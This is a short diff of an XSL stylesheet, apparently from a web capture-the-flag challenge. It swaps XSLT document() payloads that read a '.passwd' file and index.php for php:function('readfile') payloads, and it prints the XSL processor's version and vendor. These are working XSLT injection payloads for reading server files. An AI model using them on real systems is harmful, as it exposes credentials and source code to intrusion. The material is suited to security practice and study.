@@ -13,12 +13,8 @@
     </p>
   </div>
 </xsl:for-each>
-<xsl:copy-of select="document('file://.passwd')"/>
-<xsl:copy-of select="document('.passwd')"/>
-<xsl:copy-of select="document('file:///challenge/web-serveur/ch50/.passwd')"/>
-<xsl:copy-of select="document('file://index.php')"/>
-<xsl:copy-of select="document('index.php')"/>
-<xsl:copy-of select="document('file:///challenge/web-serveur/ch50/index.php')"/>
+<xsl:value-of select="php:function('readfile','index.php')" />
+<xsl:value-of select="php:function('readfile','/challenge/web-serveur/ch50/index.php')" />
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
